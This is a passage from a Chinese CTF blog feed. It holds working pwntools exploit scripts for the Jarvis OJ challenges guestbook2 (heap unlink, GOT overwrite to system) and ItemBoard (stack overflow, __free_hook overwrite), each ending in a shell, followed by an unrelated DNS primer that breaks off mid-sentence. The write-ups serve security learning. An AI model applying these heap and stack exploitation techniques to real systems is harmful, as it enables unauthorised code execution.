class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./guestbook2'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)# , open('aa'))</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'pwn.jarvisoj.com'</span> , <span class="number">9879</span>)<span class="comment">#nc pwn.jarvisoj.com 9879</span></span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lst</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(<span class="string">'\n== PCTF'</span>)[:<span class="number">-8</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(length , content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'new post: '</span>)</span><br><span class="line">    p.sendline(str(length))</span><br><span class="line">    p.recvuntil(<span class="string">'your post: '</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num , length , content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'number: '</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">'of post: '</span>)</span><br><span class="line">    p.sendline(str(length))</span><br><span class="line">    p.recvuntil(<span class="string">'your post: '</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'number: '</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./guestbook2'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">add(<span class="number">0x80</span> , str(i)*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Make freed_chunk1_fd be chunk3_ptr then leak heap base</span></span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">dele(<span class="number">1</span>)<span class="comment">#We have a dangling_ptr</span></span><br><span class="line">edit(<span class="number">0</span> , <span class="number">0x90</span> , <span class="string">'a'</span> * <span class="number">0x20</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">a = lst().split(<span class="string">'\n'</span>)[<span class="number">0</span>][<span class="number">0x93</span>:]</span><br><span class="line">heap_base = u64(a + <span class="string">'\x00'</span> * (<span class="number">8</span> - len(a))) - <span class="number">0x19d0</span></span><br><span class="line">chunk0_addr = heap_base + <span class="number">0x30</span></span><br><span class="line">success(<span class="string">'heap_base =&gt; '</span> + hex(heap_base))</span><br><span class="line">success(<span class="string">'chunk0_addr =&gt; '</span> + hex(chunk0_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#Make a fake_chunk satisfied the condition of unlink</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x80</span>) + p64(chunk0_addr - <span class="number">0x18</span>) + p64(chunk0_addr - <span class="number">0x10</span>) + <span class="string">'a'</span> * <span class="number">0x60</span> + p64(<span class="number">0x80</span>) + p64(<span class="number">0x90</span>) + <span class="string">'a'</span> * <span class="number">0x70</span></span><br><span class="line"><span class="comment">#fake_prev_sizefake_size fake_fd = ptr - 0x18  fake_bk = ptr - 0x10   messchunk1_prev_size chunk1_size mess duiqi 0x80</span></span><br><span class="line"><span class="keyword">print</span> hex(len(payload))</span><br><span class="line">edit(<span class="number">0</span> , len(payload) , payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#trigger unlink</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#result:  chunk0_addr = chunk0_addr - 0x18</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc.address &amp; get system_address </span></span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">payload = p64(<span class="number">2</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0x100</span>) + p64(chunk0_addr - <span class="number">0x18</span>) + p64(<span class="number">1</span>) + p64(<span class="number">8</span>) + p64(atoi_got)</span><br><span class="line">payload += <span class="string">'\x00'</span> * (<span class="number">0x100</span> - len(payload))</span><br><span class="line">edit(<span class="number">0</span> , len(payload) , payload)</span><br><span class="line">a = lst().split(<span class="string">'1. '</span>)[<span class="number">1</span>]</span><br><span class="line">atoi_addr = u64(a + <span class="string">'\x00'</span> * (<span class="number">8</span> - len(a)))</span><br><span class="line">libc.address = atoi_addr - libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">system_addr = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">success(<span class="string">'atoi_addr =&gt; '</span> + hex(atoi_addr))</span><br><span class="line">success(<span class="string">'libc_base =&gt; '</span> + hex(libc.address))</span><br><span class="line">success(<span class="string">'system_addr =&gt; '</span> + hex(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#write atoi to system &amp; get shell</span></span><br><span class="line">edit(<span class="number">1</span> , <span class="number">8</span> , p64(system_addr)) </span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="0x05-450pt-ItemBoard"><a href="#0x05-450pt-ItemBoard" class="headerlink" title="0x05 450pt ItemBoard"></a>0x05 450pt ItemBoard</h2><p>题目没有去符号表，根据ida可分析出<strong>item</strong>数据结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">item</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">char</span> *description;</span><br><span class="line">    <span class="keyword">void</span> (*item_free)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>漏洞位置<br>漏洞位于<strong>new_item</strong>函数中，在输入<strong>description</strong>时给中间变量<strong>buf</strong>的长度可控，而<strong>buf</strong>为<strong>char buf[1024]</strong>，此处存在缓冲区溢出。此外在执行<strong>item_free</strong>时只没有清除指针，并且在<strong>list_item</strong>和<strong>show_item</strong>的时候没有检查是否<strong>inuse</strong>。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-0888b24a3590c5ec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="new_item"><br><img src="https://upload-images.jianshu.io/upload_images/8447551-f4fb179dc62b82ab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="item_free"><br><img src="https://upload-images.jianshu.io/upload_images/8447551-f77ca0b794807b49.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="list_item"><br><img src="https://upload-images.jianshu.io/upload_images/8447551-b2d699526ff69a70.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="show_item"></li></ul><blockquote><ul><li>善于利用栈上的结构体，并结合代码段的写操作构造合理的覆盖</li><li><strong>__free_hook_ptr</strong>的定位，<strong>pwntools</strong>库中的<strong>libc.symbols</strong>无法定位到<strong>__free_hook_ptr</strong>，<strong>ida</strong>中查找也不是特别方便，只好在调试时先确定<strong>__free_hook</strong>的地址，再用<strong>find</strong>的指令查找<strong>__free_hook</strong>再减去<strong>libc</strong>基址便可得到<strong>__free_hook_ptr</strong>的偏移。</li><li>在远程使用不同的<strong>libc</strong>时通过<strong>freed unsort bin</strong>上指向<strong>main_arena</strong>泄露地址找<strong>libc</strong>基址时偏移与本地不同的方法：可先减去<strong>__malloc_hook</strong>的偏移，然后再强行页对齐，由于<strong>main_arena</strong>在<strong>__malloc_hook</strong>下面不远处，所以先减去<strong>__malloc_hook</strong>后，离页对齐差的不是很多，可以一眼看出来该如何对齐。</li></ul></blockquote><ul><li>利用思路</li></ul><p>第一步，先构造<strong>free</strong>到<strong>unsort bin</strong>上的堆块，<strong>free</strong>后产生指向<strong>main_arena</strong>的地址，并通过<strong>show_item</strong>来<strong>leak</strong>出<strong>libc</strong>的基址。第二步，通过控制<strong>v2</strong>溢出<strong>buf</strong>并且继续向下覆盖掉i栈上的<strong>item</strong>结构体，在下面<strong>strcpy</strong>的时候，将<strong>buf</strong>赋值给覆盖后新的<strong>item + 8</strong>指向的地方。正常情况下我们会将<strong>free_hook</strong>改成<strong>system</strong>函数，所以我们可将<strong>item</strong>覆盖为<strong>+8</strong>后指向<strong>free_hook</strong>的地方。恰好，在<strong>libc</strong>里面会有一个<strong>__free_hook_ptr</strong>是指向<strong>__free_hook</strong>的。所以整体思路为：泄露出<strong>libc</strong>基址后，将栈上的<strong>item</strong>结构体指针覆盖为<strong>__free_hook_ptr - 8</strong>，然后通过<strong>strcpy</strong>把<strong>__free_hook</strong>覆盖为<strong>system</strong>地址，然后<strong>free</strong>掉写有<strong>/bin/sh</strong>的堆块即可<strong>get shell</strong>。</p><ul><li><strong>my-exp</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">---</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">'./itemboard'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'pwn2.jarvisoj.com'</span> , <span class="number">9887</span>)<span class="comment">#nc pwn2.jarvisoj.com 9887</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.19.so'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./itemboard'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name , length , description)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choose:\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name?\n'</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.recvuntil(<span class="string">'len?\n'</span>)</span><br><span class="line">p.sendline(str(length))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Description?\n'</span>)</span><br><span class="line">p.sendline(description)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lst</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choose:\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(<span class="string">'1.Add'</span>)[:<span class="number">-6</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(no)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choose:\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'item?\n'</span>)</span><br><span class="line">p.sendline(str(no))</span><br><span class="line">a = p.recvuntil(<span class="string">'1.Add'</span>)[:<span class="number">-6</span>]</span><br><span class="line">name = a.split(<span class="string">'\nDescription:'</span>)[<span class="number">0</span>].split(<span class="string">'Name:'</span>)[<span class="number">1</span>]</span><br><span class="line">description = a.split(<span class="string">'\nDescription:'</span>)[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">return</span> name , description</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(no)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choose:\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'item?\n'</span>)</span><br><span class="line">p.sendline(str(no))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">print</span> pidof(p)[<span class="number">0</span>]</span><br><span class="line">raw_input()</span><br><span class="line"></span><br><span class="line">add(<span class="string">'a'</span> * <span class="number">0x10</span> , <span class="number">0x80</span> , <span class="string">'1'</span> * <span class="number">4</span> + <span class="string">'Just A Fish Test'</span> + <span class="string">'2'</span> * <span class="number">4</span>)</span><br><span class="line">add(<span class="string">'b'</span> * <span class="number">0x10</span> , <span class="number">0x80</span> , <span class="string">'3'</span> * <span class="number">4</span> + <span class="string">'Just A Fish Test'</span> + <span class="string">'4'</span> * <span class="number">4</span>)</span><br><span class="line">add(<span class="string">'c'</span> * <span class="number">0x10</span> , <span class="number">0x80</span> , <span class="string">'5'</span> * <span class="number">4</span> + <span class="string">'Just A Fish Test'</span> + <span class="string">'6'</span> * <span class="number">4</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">libc.address = u64(show(<span class="number">1</span>)[<span class="number">1</span>] + <span class="string">'\x00'</span> * <span class="number">2</span>) - libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x68</span></span><br><span class="line">free_hook_ptr = libc.address + <span class="number">0x3c3ef8</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">libc.address = u64(show(<span class="number">1</span>)[<span class="number">1</span>] + <span class="string">'\x00'</span> * <span class="number">2</span>) - libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x78</span></span><br><span class="line">free_hook_ptr = libc.address + <span class="number">0x3bdee8</span></span><br><span class="line"></span><br><span class="line">system_addr = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">success(<span class="string">'libc_base =&gt; '</span> + hex(libc.address))</span><br><span class="line">success(<span class="string">'free_hook_ptr =&gt; '</span> + hex(free_hook_ptr))</span><br><span class="line">success(<span class="string">'system_addr = &gt; '</span> + hex(system_addr))</span><br><span class="line">add(<span class="string">'/bin/sh\x00'</span> , <span class="number">0x410</span> , p64(system_addr) + <span class="string">'a'</span> * <span class="number">0x400</span> + p64(free_hook_ptr - <span class="number">8</span>))</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>由一道题目引发的DNS学习笔记</title>
      <link href="/2020/03/12/%E7%94%B1%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%BC%95%E5%8F%91%E7%9A%84DNS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/03/12/%E7%94%B1%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%BC%95%E5%8F%91%E7%9A%84DNS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-起因"><a href="#0x00-起因" class="headerlink" title="0x00 起因"></a>0x00 起因</h2><blockquote><p>前几天的<strong>全国高校网络信息安全管理运维挑战赛</strong>的<strong>DNS101</strong>，从上午查资料到结束，虽然最终做出来了，但却不解其原理，遂开启了对DNS的学习历程。</p></blockquote><a id="more"></a><hr><h2 id="0x01-DNS是什么"><a href="#0x01-DNS是什么" class="headerlink" title="0x01 DNS是什么"></a>0x01 DNS是什么</h2><p><em>DNS（Domain Name System，域名系统），因特网上作为域名和IP地址相互映射的一个分布式数据库，能够使用户更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。通过主机名，最终得到该主机名对应的IP地址的过程叫做域名解析（或主机名解析）。</em> <strong>摘自百度百科</strong></p><blockquote><p>百科的解释非常直接，但对于我这种小白来说太过宽泛，看了之后有了个大致的了解，却也说不清到底是个啥，我还学要了解更多。<del>万一别人问起来至少要吹牛逼吹得高大上一些嘛</del></p></blockquote><hr><h2 id="0x02-为什么会有DNS"><a href="#0x02-为什么会有DNS" class="headerlink" title="0x02 为什么会有DNS"></a>0x02 为什么会有DNS</h2><p>网络通讯大部分都是基于<strong>TCP/IP</strong>协议，而此协议则是基于<strong>IP地址</strong>，所以计算机在网络上进行通讯时只能识别如<strong>1.2.3.4</strong>之类的<strong>IP地址</strong>而不能识别<strong>域名</strong>。由于<strong>IP地址</strong>不方便记忆，于是需要DNS将输入的<strong>域名</strong>“翻译”成相对应的<strong>IP地址</strong>，正确访问对应的网页。</p><hr><h2 id="0x03-需要知道的一些术语"><a href="#0x03-需要知道的一些术语" class="headerlink" title="0x03 需要知道的一些术语"></a>0x03 需要知道的一些术语</h2><h3 id="域名-Domain-Name"><a href="#域名-Domain-Name" class="headerlink" title="域名(Domain Name)"></a><strong>域名</strong>(Domain Name)</h3><p>这大概是我们接触到的DNS最常用方式，也就是我们通常所说的网址如<strong>baidu.com</strong>,<strong>google.com</strong>等。</p><h3 id="顶级域名-Top-Level-Domain"><a href="#顶级域名-Top-Level-Domain" class="headerlink" title="顶级域名(Top-Level Domain)"></a><strong>顶级域名</strong>(Top-Level Domain)</h3><p>又称一级域名，分为三类：一是<strong>国家和地区顶级域名</strong>(country code top-level domains，简称ccTLDs)，如<strong>cn</strong>，<strong>jp</strong>等；二是<strong>国际顶级域名</strong>(generic top-level domains，简称gTLDs)，如表示工商企业的<strong>com</strong>，表示网络提供商的<strong>net</strong>，表示非盈利组织的<strong>org</strong>等。三是<strong>新顶级域名</strong>（New gTLD）如通用的<strong>xyz</strong>、代表“红色”的<strong>red</strong>、代表“人”的<strong>men</strong>等一千多种。</p><h3 id="全称域名-FullyQualified-Domain-Name"><a href="#全称域名-FullyQualified-Domain-Name" class="headerlink" title="全称域名(FullyQualified Domain Name)"></a><strong>全称域名</strong>(FullyQualified Domain Name)</h3><p>又称完全合格域名，是指主机名加上全称路径，全路径中列出了序列中所有域成员。可以从逻辑上准确地表示出主机在域名树中的位置，也可以说全称域名是主机名的一种完全表示形式。如<strong><a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></strong>,<strong><a href="http://www.google.com" target="_blank" rel="noopener">www.google.com</a></strong>等。</p><h3 id="IP地址-IP-Address"><a href="#IP地址-IP-Address" class="headerlink" title="IP地址(IP Address)"></a><strong>IP地址</strong>(IP Address)</h3><p><strong>IP地址</strong>用于以数字(IPv4)或字母数字(IPv6)的形式唯一地在网络上寻址。<br>一个IPv4地址是由四个数字和三个将数字分开的冒号所构成如<strong>127.0.0.1</strong>。随着全世界越来越多的设备和人员上线，对IPv4地址有限且需求达到顶峰，于是IPv6应运而生。IPv6遵循与IPv4相似的原则:允许设备在其所在的网络上被唯一引用，但是寻址语法包含字母、数字、字符以增加可用地址的数量，如<strong>fe80::45a8:3bcd:fb46:82b%36</strong>。</p><h3 id="Zone文件-Zonefile"><a href="#Zone文件-Zonefile" class="headerlink" title="Zone文件(Zonefile)"></a><strong>Zone文件</strong>(Zonefile)</h3><p>Zonefile是一个包含单个域的不同<strong>记录</strong>的文本文件，文件中每一行都包含特定域的名称以及与其关联的值和类型。<br>如在google.com的zonefile中可能存在一行用于解析<strong>www</strong>并通过<strong>A记录</strong>映射到<strong>173.194.34.68</strong>(谷歌的ip)。</p><h3 id="记录-Records"><a href="#记录-Records" class="headerlink" title="记录(Records)"></a><strong>记录</strong>(Records)</h3><p>DNS的<strong>记录</strong>是域和相关数据之间的独立映射。</p><ul><li><strong>A记录</strong>：又称<strong>IP指向</strong>，用户可以在此设置子域名并指向到自己的目标主机地址上，从而实现通过域名找到服务器。</li></ul><blockquote><p>指向的目标主机地址类型只能使用<strong>IP地址</strong>。</p></blockquote><ul><li><strong>PTR记录</strong>：<strong>指针记录</strong>，是<strong>A记录</strong>逆向记录，用于将<strong>IP地址</strong>解析为域名。</li></ul><ul><li><strong>AAAA记录</strong>：IPv6下的<strong>A记录</strong>和<strong>PTR记录</strong>，可将一个域名解析到IPv6地址上，也可以将子域名解析到IPv6地址上。</li></ul><ul><li><strong>CNAME记录</strong>：又称<strong>别名指向</strong>，用户可以为主机设置一个别名。如设置fish.o0O.com指向一个主机<a href="http://www.google.com那么以后就能用fish.o0O.com来代替访问www.google.com了。" target="_blank" rel="noopener">www.google.com那么以后就能用fish.o0O.com来代替访问www.google.com了。</a></li></ul><blockquote><p><strong>CNAME</strong>的目标主机地址只能使用主机名，不能使用<strong>IP地址</strong>；主机名前不能有任何其他前缀，如<em>http://</em>等是不被允许的；<strong>A记录</strong>优先于<strong>CNAME记录</strong>，即如果一个主机地址同时存在<strong>A记录</strong>和<strong>CNAME记录</strong>，则<strong>CNAME记录</strong>不生效。</p></blockquote><ul><li><strong>MX记录</strong>：<strong>邮箱交换记录</strong>，用于将以改域名为结尾的电子邮件指向对应的邮件服务器以进行处理。如用户所用的邮件十以域名fish.com结尾的，则需要在Zonefile中添加一条<strong>MX记录</strong>来处理所有以@fish.com结尾的邮件。</li></ul><blockquote><p><strong>MX记录</strong>可以使用主机名或<strong>IP地址</strong>；<strong>MX记录</strong>可以通过设置优先级实现主辅服务器设置，“优先级”中的数字越小表示级别越高。也可以使用相同优先级达到负载均衡的目的；若在“主机名”中填入子域名则此<strong>MX记录</strong>只对该子域名生效。 </p></blockquote><ul><li><strong>NS记录</strong>：<strong>域名服务器记录</strong>，用来表明由哪台服务器对该域名进行解析。如用户希望由1.2.3.4来解析fish.o0O.com，则需要设置fish.o0O.com的<strong>NS记录</strong>。</li></ul><blockquote><p>“优先级”中的数字越小表示级别越高；“IP地址/主机名”中既可以填写<strong>IP地址</strong>，也可以填写像cat.o0O.com这样的主机地址，但必须保证该主机地址有效。如将fish.o0O.com的<strong>NS记录</strong>指向到cat.o0O.com，在设置<strong>NS记录</strong>的同时还需要设置cat.o0O.com的指向，否则<strong>NS记录</strong>将无法正常解析；<strong>NS记录</strong>优先于<strong>A记录</strong>，即如果一个主机地址同时存在<strong>NS记录</strong>和<strong>A记录</strong>，则<strong>A记录</strong>不生效。这里的<strong>NS记录</strong>只对子域名生效。</p></blockquote><ul><li><strong>SOA记录</strong>：<strong>起始授权机构记录</strong>，<strong>NS记录</strong>说明了有多台服务器在进行解析，而<strong>SOA记录</strong>则说明了在众多<strong>NS记录</strong>中主要服务器的<strong>记录</strong>。</li></ul><blockquote><p><strong>NS记录</strong>和<strong>SOA记录</strong>是任何一个DNS的<strong>Zonefile</strong>中都不可或缺的两条<strong>记录</strong>。</p></blockquote><ul><li><strong>SRV记录</strong>：<strong>服务器资源记录</strong>，是在RFC2052中新定义的<strong>记录</strong>，很多老版本的DNS并不支持此<strong>记录</strong>。<strong>SRV记录</strong>说明了一个服务器能够提供什么样的服务，域内的计算机需要依赖DNS中的<strong>SRV记录</strong>来定位域控制器。</li></ul><ul><li><strong>TXT记录</strong>：为某条<strong>记录</strong>设置说明，起注释的作用。</li></ul><blockquote><p>此处只列举了一部分<strong>记录</strong>，实际上还存在DNS还存在很多类型的<strong>记录</strong></p></blockquote><h3 id="An-Example-of-Zonefile"><a href="#An-Example-of-Zonefile" class="headerlink" title="An Example of Zonefile"></a>An Example of Zonefile</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$TTL     86400;      &#x2F;&#x2F; specified in seconds, but could be 24h or 1d</span><br><span class="line">$ORIGIN  example.com</span><br><span class="line"></span><br><span class="line">@ 1D IN SOA ns1.example.com. hostmaster.example.com. (</span><br><span class="line">            123456 ; &#x2F;&#x2F; serial</span><br><span class="line">                  3H     ;   &#x2F;&#x2F; refresh</span><br><span class="line">            15     ; &#x2F;&#x2F; retry</span><br><span class="line">            1w     ; &#x2F;&#x2F; example</span><br><span class="line">            3h     ; &#x2F;&#x2F; minimum</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">      IN NS ns1.example.com</span><br><span class="line">      IN NS ns2.example.com &#x2F;&#x2F; Good practice to specify multiple nameservers for fault-tolerance</span><br><span class="line">      IN NS ns1.foo.com     &#x2F;&#x2F; Using external nameservers for fault-tolerance is even better</span><br><span class="line">      IN NS ns1.bar.com     &#x2F;&#x2F; And multiple external nameservers is better still!</span><br><span class="line"></span><br><span class="line">      IN MX 10 mail.example.com &#x2F;&#x2F; Here, 10 is the highest priority mail server, so is the first to be used</span><br><span class="line">      IN MX 20 mail.foo.com     &#x2F;&#x2F; If the highest priority mail server is unavailable, fall back to this one</span><br><span class="line"></span><br><span class="line">ns1   IN A     1.2.3.4</span><br><span class="line">ns1   IN AAAA  1234:5678:a1234::12 &#x2F;&#x2F; A and AAAA records can co-exist happily. Useful for supporting early IPv6 adopters.</span><br><span class="line">ns2   IN A     5.6.7.8</span><br><span class="line">ns2   IN A     1234:5678:a1234::89</span><br><span class="line">mail  IN A     1.3.5.7</span><br><span class="line">www   IN A     2.4.6.8</span><br><span class="line">sip   IN CNAME www.example.com.</span><br><span class="line">ftp   IN CNAME www.example.com.</span><br><span class="line">mail  IN TXT   &quot;v&#x3D;spf1 a -all&quot;</span><br><span class="line"></span><br><span class="line">_sip._tcp.example.com. IN SRV 0 5 5060 sip.example.com.</span><br></pre></td></tr></table></figure><hr><h2 id="0x04-DNS如何工作"><a href="#0x04-DNS如何工作" class="headerlink" title="0x04 DNS如何工作"></a>0x04 DNS如何工作</h2><h3 id="根服务器-Root-Servers"><a href="#根服务器-Root-Servers" class="headerlink" title="根服务器(Root Servers)"></a><strong>根服务器</strong>(Root Servers)</h3><p>DNS树的顶端是13个(从a到m)由ICANN(<a href="https://icann.org/" target="_blank" rel="noopener">Internet Corporation for Assigned Names and Numbers</a>)控制的独立的<strong>根服务器</strong>。目的是处理那些级别较低的域名服务器不能充分处理的与<strong>顶级域名</strong>相关的信息请求。<strong>根服务器</strong>不会对自己无法处理的域名保存任何<strong>记录</strong>，只会不停地对请求做出响应，并把域名解析到最优的域名服务器去进行进一步处理。</p><blockquote><p>如我们对<strong><a href="http://www.google.com" target="_blank" rel="noopener">www.google.com</a></strong>的请求直接进入<strong>根服务器</strong>，<strong>根服务器</strong>将解析<strong><a href="http://www.google.com" target="_blank" 